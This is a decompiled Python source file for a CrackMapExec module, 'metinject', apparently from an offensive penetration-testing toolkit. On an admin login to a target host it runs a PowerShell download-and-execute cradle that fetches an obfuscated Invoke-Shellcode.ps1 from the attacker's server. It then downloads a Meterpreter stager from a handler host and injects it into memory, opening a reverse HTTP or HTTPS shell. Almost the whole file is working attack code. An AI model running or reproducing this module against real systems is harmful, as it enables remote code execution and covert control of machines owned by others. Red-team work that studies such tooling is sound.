# uncompyle6 version 3.6.7
# Python bytecode 2.7 (62211)
# Decompiled from: Python 3.8.2 (tags/v3.8.2:7b3ab59, Feb 25 2020, 23:03:10) [MSC v.1916 64 bit (AMD64)]
# Embedded file name: /home/byt3bl33d3r/.virtualenvs/CME_old/lib/python2.7/site-packages/cme/modules/met_inject.py
# Compiled at: 2016-12-29 01:51:56
from cme.helpers import gen_random_string, create_ps_command, obfs_ps_script, get_ps_script
from sys import exit

class CMEModule:
    """
        Downloads the Meterpreter stager and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script
        Module by @byt3bl33d3r
    """
    name = 'metinject'
    description = "Downloads the Meterpreter stager and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script"

    def options(self, context, module_options):
        """
            LHOST    IP hosting the handler
            LPORT    Handler port
            PAYLOAD  Payload to inject: reverse_http or reverse_https (default: reverse_https)
            PROCID   Process ID to inject into (default: current powershell process)
        """
        if 'LHOST' not in module_options or 'LPORT' not in module_options:
            context.log.error('LHOST and LPORT options are required!')
            exit(1)
        self.met_payload = 'reverse_https'
        self.lhost = None
        self.lport = None
        self.procid = None
        if 'PAYLOAD' in module_options:
            self.met_payload = module_options['PAYLOAD']
        if 'PROCID' in module_options:
            self.procid = module_options['PROCID']
        self.lhost = module_options['LHOST']
        self.lport = module_options['LPORT']
        self.obfs_name = gen_random_string()
        return

    def on_admin_login(self, context, connection):
        payload = ('\n        IEX (New-Object Net.WebClient).DownloadString(\'{}://{}:{}/Invoke-Shellcode.ps1\')\n        $CharArray = 48..57 + 65..90 + 97..122 | ForEach-Object {{[Char]$_}}\n        $SumTest = $False\n        while ($SumTest -eq $False)\n        {{\n            $GeneratedUri = $CharArray | Get-Random -Count 4\n            $SumTest = (([int[]] $GeneratedUri | Measure-Object -Sum).Sum % 0x100 -eq 92)\n        }}\n        $RequestUri = -join $GeneratedUri\n        $Request = "{}://{}:{}/$($RequestUri)"\n        $WebClient = New-Object System.Net.WebClient\n        [Byte[]]$bytes = $WebClient.DownloadData($Request)\n        Invoke-{} -Force -Shellcode $bytes').format(context.server, context.localip, context.server_port, 'http' if self.met_payload == 'reverse_http' else 'https', self.lhost, self.lport, self.obfs_name)
        if self.procid:
            payload += (' -ProcessID {}').format(self.procid)
        context.log.debug(('Payload:{}').format(payload))
        payload = create_ps_command(payload, force_ps32=True)
        connection.execute(payload)
        context.log.success('Executed payload')

    def on_request(self, context, request):
        if 'Invoke-Shellcode.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()
            with open(get_ps_script('PowerSploit/CodeExecution/Invoke-Shellcode.ps1'), 'r') as (ps_script):
                ps_script = obfs_ps_script(ps_script.read(), self.obfs_name)
                request.wfile.write(ps_script)
            request.stop_tracking_host()
        else:
            request.send_response(404)
            request.end_headers()